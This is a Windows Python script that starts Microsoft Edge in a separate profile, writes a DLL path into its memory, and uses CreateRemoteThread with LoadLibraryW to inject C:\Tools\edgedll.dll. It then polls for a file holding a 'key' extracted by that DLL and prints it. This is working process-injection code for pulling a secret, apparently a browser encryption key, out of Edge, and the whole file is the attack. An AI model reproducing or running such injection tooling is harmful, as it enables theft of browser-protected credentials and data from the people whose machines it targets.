import ctypes, ctypes.wintypes as wt, time, os, sys

k32 = ctypes.windll.kernel32

def w(x): open(r"C:\Tools\inj_log.txt","a").write(str(x)+"\n")

open(r"C:\Tools\inj_log.txt","w").write("")

EDGE = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
# must be a NEW instance -> separate user-data-dir
CMD = EDGE + ' --user-data-dir=C:\\Tools\\edgehost --no-first-run --no-default-browser-check --disable-background-networking'

class STARTUPINFO(ctypes.Structure):
    _fields_ = [("cb",wt.DWORD),("lpReserved",wt.LPWSTR),("lpDesktop",wt.LPWSTR),
        ("lpTitle",wt.LPWSTR),("dwX",wt.DWORD),("dwY",wt.DWORD),("dwXSize",wt.DWORD),
        ("dwYSize",wt.DWORD),("dwXCountChars",wt.DWORD),("dwYCountChars",wt.DWORD),
        ("dwFillAttribute",wt.DWORD),("dwFlags",wt.DWORD),("wShowWindow",wt.WORD),
        ("cbReserved2",wt.WORD),("lpReserved2",ctypes.c_void_p),("hStdInput",wt.HANDLE),
        ("hStdOutput",wt.HANDLE),("hStdError",wt.HANDLE)]

class PROCINFO(ctypes.Structure):
    _fields_ = [("hProcess",wt.HANDLE),("hThread",wt.HANDLE),("dwProcessId",wt.DWORD),("dwThreadId",wt.DWORD)]

si = STARTUPINFO(); si.cb = ctypes.sizeof(si)
pi = PROCINFO()
w("creating suspended edge...")
ok = k32.CreateProcessW(EDGE, CMD, None, None, False, 0x4, None, r"C:\Tools", ctypes.byref(si), ctypes.byref(pi))
if not ok:
    w("CreateProcess failed gle=%d" % k32.GetLastError()); sys.exit(1)
w("pid=%d" % pi.dwProcessId)

dll_path = ctypes.create_unicode_buffer(r"C:\Tools\edgedll.dll")
alloc = k32.VirtualAllocEx(pi.hProcess, None, ctypes.sizeof(dll_path), 0x3000, 0x40)
if not alloc:
    w("VirtualAllocEx failed"); sys.exit(1)
w("remote mem=0x%X" % alloc)
wrote = ctypes.c_size_t()
k32.WriteProcessMemory(pi.hProcess, alloc, dll_path, ctypes.sizeof(dll_path), ctypes.byref(wrote))
w("wrote %d bytes" % wrote.value)

loadlib = k32.GetProcAddress(k32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryW")
tid = wt.DWORD()
hthread = k32.CreateRemoteThread(pi.hProcess, None, 0, loadlib, alloc, 0, ctypes.byref(tid))
if not hthread:
    w("CreateRemoteThread failed gle=%d" % k32.GetLastError()); sys.exit(1)
w("remote thread tid=%d, waiting..." % tid.value)
k32.WaitForSingleObject(hthread, 15000)

# poll for the key file
key = None
for _ in range(20):
    try:
        with open(r"C:\Tools\key_out.txt") as f:
            key = f.read().strip()
        break
    except Exception:
        time.sleep(0.5)

w("key: %s" % key)
k32.TerminateProcess(pi.hProcess, 0)
print("RESULT:" + str(key))